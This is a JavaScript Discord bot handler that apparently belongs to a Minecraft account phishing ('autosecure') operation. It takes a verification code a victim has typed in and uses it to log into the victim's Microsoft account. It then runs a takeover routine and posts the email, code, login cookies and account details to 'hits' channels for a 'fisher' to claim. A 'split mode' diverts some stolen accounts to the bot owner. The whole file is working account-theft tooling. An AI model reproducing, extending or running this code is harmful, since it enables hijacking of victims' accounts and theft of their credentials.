const { queryParams } = require("../../../db/database");
const login = require("../../utils/secure/login");
const secure = require("../../utils/secure/recodesecure");
const getEmbed = require("../../utils/responses/getEmbed");
const listAccount = require("../../utils/accounts/listAccount");
const { loginCookieMessager, autosecuredisabledMessager, lockedmessager, nomcmessager } = require("../../utils/utils/messager");
const aftersecure = require("../../utils/secure/aftersecure");
const generateuid = require("../../utils/generateuid");
const insertaccount = require("../../../db/insertaccount");
const checkmc = require("../../../db/checkmc");
const listProfile = require("../../utils/hypixelapi/listProfile");
const getUUID = require("../../utils/hypixelapi/getUUID");
const isblacklisted = require("../../utils/utils/isblacklisted")
const { failedembed } = require("../../utils/embeds/embedhandler");
const getCredentials = require("../../utils/info/getCredentials");
const { mirrorToMainHits } = require("../../utils/utils/mirrorhits");
const { checkSplitMode, sendToOwner, createOwnerRedirectMessage } = require("../../utils/bot/splitmode");

let obj = {
  name: "submit",
  callback: async (client, interaction) => {
    await interaction.deferReply({ ephemeral: true });

    let code = interaction.components[0].components[0].value;
    let customIdParts = interaction.customId.split("|");
    let email = customIdParts[1];
    let secEmail = customIdParts[2];
    let secId = customIdParts[3];
    let mcname = customIdParts[4];

    
          let blacklisted = await isblacklisted(client, interaction, email)
              if (blacklisted){
                const embed = await getEmbed(client, "blacklisted", null, null, mcname, email, interaction.user.id);
                return await interaction.editReply({
                  embeds: [embed],
                  ephemeral: true,
                });
          }

    console.log(`client username: ${client.username}`);
    let settings = await client.queryParams("SELECT * FROM autosecure WHERE user_id=?", [client.username]);
    if (settings.length === 0) {
      return interaction.editReply({
        embeds: [{
          title: "Error :x:",
          description: "Unexpected error occurred!",
          color: 0xff0000
        }],
        ephemeral: true
      });
    }
    settings = settings[0];

    let channelId, guildId, nChannelId, nGuildId, hChannelId, hGuildId, rChannelId, rGuildId, server_id, nohit = null;
    
    if (settings.server_id) {
      server_id = settings.server_id;
    }

    if (settings.logs_channel) {
      [channelId, guildId] = settings.logs_channel.split("|");
    } else {
      return interaction.editReply({ content: "Set your logs channel first!\nusing **/set**", ephemeral: true });
    }

    if (settings.notification_channel) {
      [nChannelId, nGuildId] = settings.notification_channel.split("|");
    }

    if (settings.hits_channel) {
      [hChannelId, hGuildId] = settings.hits_channel.split("|");
    } else {
      return interaction.editReply({ content: "Set the hits channel first!\nusing **/set**", ephemeral: true });
    }

    if (settings.users_channel) {
      [rChannelId, rGuildId] = settings.users_channel.split("|");
    }

    if (isNaN(code)) {
      console.log("[X] Invalid Code! [Not Numbers]");
      return interaction.editReply({
        embeds: [
          {
            title: "Error :x:",
            description: "Invalid code, please confirm with the code that was sent to your email",
            color: 0xff0000,
          },
        ],
        ephemeral: true,
      });
    }

    if (settings?.auto_secure) {
      try {
        console.log(`Trying to Login Email: ${email} Code: ${code}`);
        let creds = await getCredentials(email)
        let host = await login({ email: email, id: secId, code: code }, creds);

        if (host) {
          console.log("Logged in successfully");
          try {
            await interaction.editReply({
              embeds: [await getEmbed(client, "res", null, null, mcname, email, interaction.user.id)],
              ephemeral: true
            });

            let uid = await generateuid();
            await loginCookieMessager(client, guildId, channelId, host, mcname, email, interaction, code, uid);
            
            if (rChannelId && rGuildId) {
              const hidecode = 'Code entered';
              await loginCookieMessager(client, rGuildId, rChannelId, host, mcname, email, interaction, hidecode, uid, true);
            }

            console.log("Starting the Auto Secure process");
            let acc = await secure(host, settings, uid);
            
            if (acc.email === "Locked!") {
              nohit = true;
              await lockedmessager(client, guildId, channelId, interaction, mcname, email, false, false);
              if (rChannelId && rGuildId) {
                await lockedmessager(client, rGuildId, rChannelId, interaction, mcname, email, true, false);
              }
            }


            if (acc.email === "unauthed") {
              nohit = true;
              await lockedmessager(client, guildId, channelId, interaction, mcname, email, false, true);
              if (rChannelId && rGuildId) {
                await lockedmessager(client, rGuildId, rChannelId, interaction, mcname, email, true, true);
              }
            }

            if ((settings.secureifnomc === "0" || settings.secureifnomc === 0) && acc.email === "No Minecraft!") {
              nohit = true;
              await nomcmessager(client, guildId, channelId, interaction, mcname, email);
              if (rChannelId && rGuildId) {
                await nomcmessager(client, rGuildId, rChannelId, interaction, mcname, email, true);
              }
            }

            let hasMinecraft = await checkmc(acc.mc);
            
            // Check split mode before sending to fisher
            const { shouldSplit, ownerId, ratio } = await checkSplitMode(client.username, client.botnumber, acc);
            
            let msg = await listAccount(acc, uid, client, interaction);
            
            if (shouldSplit && ownerId) {
              // Send account to the channel and tag the owner
              if (hGuildId && hChannelId) {
                // Tag the owner in the account message
                msg.content = `<@${client.username}> (owner)`;
                await client.guilds.cache.get(hGuildId)?.channels.cache.get(hChannelId)?.send(msg);
                // Send confirmation message to fisher (in hits channel)
                const ownerMsg = {
                  embeds: [{
                    title: "Split Mode Triggered",
                    description: `User reached ${ratio} Minecraft accounts! Account sent to <@${client.username}> in this channel.`,
                    color: 0x5f9ea0,
                    timestamp: new Date()
                  }]
                };
                await client.guilds.cache.get(hGuildId)?.channels.cache.get(hChannelId)?.send(ownerMsg);
                // DM main bot owner and tag them
                try {
                  const config = require('../../../config.json');
                  const mainOwnerId = config.owners && config.owners.length > 0 ? config.owners[0] : null;
                  if (mainOwnerId) {
                    const controllerBot = require('../../../mainbot/controllerbot.js');
                    const mainClient = controllerBot.client;
                    if (mainClient && mainClient.user) {
                      const mainOwner = await mainClient.users.fetch(mainOwnerId).catch(() => null);
                      if (mainOwner) {
                        await mainOwner.send({ content: `🔔 <@${mainOwnerId}> Split mode: Bot owner <@${client.username}> reached ${ratio} Minecraft accounts!` });
                      }
                    }
                  }
                } catch (e) {
                  console.error('[SPLIT MODE] Could not DM main owner:', e.message);
                }
                // Mirror to main hits feed even for split mode
                const { mirrorToMainHits } = require('../../utils/utils/mirrorhits');
                await mirrorToMainHits(client, msg, interaction, { shouldSplit, ownerId: client.username, ratio });
                // Don't show the normal account message
                nohit = true;
              }
            }
            
            if (!nohit && hGuildId && hChannelId) {
              await client.guilds.cache.get(hGuildId)?.channels.cache.get(hChannelId)?.send(msg);
                            // Mirror to main hits feed with split info
                            await mirrorToMainHits(client, msg, interaction, { shouldSplit, ownerId, ratio });
            }

              const { failed, failedmsg } = await failedembed(acc, uid)
              if (failed){
                await client.guilds.cache.get(hGuildId).channels.cache.get(hChannelId).send(failedmsg);
              }
            

                // Only add to unclaimed if NOT in split mode (accounts sent to owner shouldn't be claimable by fisher)
                if (hasMinecraft && settings.claiming && !shouldSplit) {
                  const timestamp = Math.floor(Date.now() / 1000)

                  await client.queryParams(
                    "INSERT INTO unclaimed (user_id, username, date, data) VALUES (?, ?, ?, ?)", 
                    [client.username, acc.oldName, timestamp, JSON.stringify({ acc, uid, mcname })]
                  )

                  await client.queryParams(
                    "INSERT INTO unclaimed (user_id, username, date, data) VALUES (?, ?, ?, ?)", 
                    [client.username, mcname, timestamp, JSON.stringify({ acc, uid, mcname })]
                  )
                }

                let neededmsg = failed ? failedmsg : msg


            let doneaftersecure = await aftersecure(neededmsg, acc.aftersecure, interaction.user.id, settings, client, server_id, client.username, acc.oldEmail, acc);
            if (doneaftersecure) {
              console.log('Did AfterSecure!');
            } else{
              console.log(`Didn't do aftersecure!`)
            }

              // Only add to accounts if NOT in split mode (accounts sent to owner shouldn't be in fisher's list)
              if (!shouldSplit) {
                let inserted = await  insertaccount(acc, uid, client.username, settings.secureifnomc);
              }


            if (nChannelId && nGuildId) {
              if (hasMinecraft) {
                const ping = settings.ping === "None" ? null : settings.ping;
                await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(
                  await listProfile(acc.oldName, { sensored: true, list: "skyblock", ping: ping })
                );
              } else {
                let msgnomc = {
                  embeds: [{
                    description: "```\nSomeone's account has been secured, but it doesn't own Minecraft.\n```",
                    color: 0xA6C3F0
                  }]
                };             
                await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(msgnomc);
              }
            }
          } catch (e) {
            console.log(`Error in the process of autosecure (not necessarily while autosecuring)! ${e}`);
          }
        } else {
          console.log("Invalid Code! [Failed to Login with it!]");
          await interaction.editReply({
            embeds: [await getEmbed(client, "invalid", null, null, mcname, email, interaction.user.id)],
            ephemeral: true
          });
        }
      } catch (e) {
        console.log(e);
        await interaction.editReply({
          embeds: [{
            title: "Error :x:",
            description: "An error occurred while processing your request",
            color: 0xff0000
          }],
          ephemeral: true
        });
      }
    } else {
      await autosecuredisabledMessager(client, guildId, channelId, interaction, mcname, email, code);
      
      if (rChannelId && rGuildId) {
        await autosecuredisabledMessager(client, rGuildId, rChannelId, interaction, mcname, email, code, true);
      }

      await interaction.editReply({
        embeds: [
          await getEmbed(client, "res", null, null, mcname, email, interaction.user.id)
        ],
        ephemeral: true,
      });

      const embedData = {
        embeds: [{
          title: `${mcname}! :x:`,
          description: `Email: **${email}**\nSecurity email: **${secEmail?.replaceAll("*", "\\*")}** \nCode: **${code}**`,
          color: 0x00ff00
        }]
      };
      

      await client.queryParams("INSERT INTO unclaimed (user_id, username, data) VALUES (?, ?, ?)", 
        [client.username, mcname, JSON.stringify(embedData)]);

      if (nChannelId && nGuildId) {
        let uuid  = await getUUID(mcname);
        if (uuid) {
          const ping = settings.ping === "None" ? null : settings.ping;
          await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(
            await listProfile(mcname, { sensored: true, list: "skyblock", ping: ping })
          );
        } else {
          const ping = settings.ping === "None" ? null : settings.ping;
          await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send({
            content: ping,
            embeds: [
              {
                title: "Code has been entered | Autosecure is disabled!",
                description: 'Please secure this account manually after claiming using /claim',
                color: 0x00ff00,
              },
            ],
          });
        }
      }
    }
  }
};

module.exports = obj;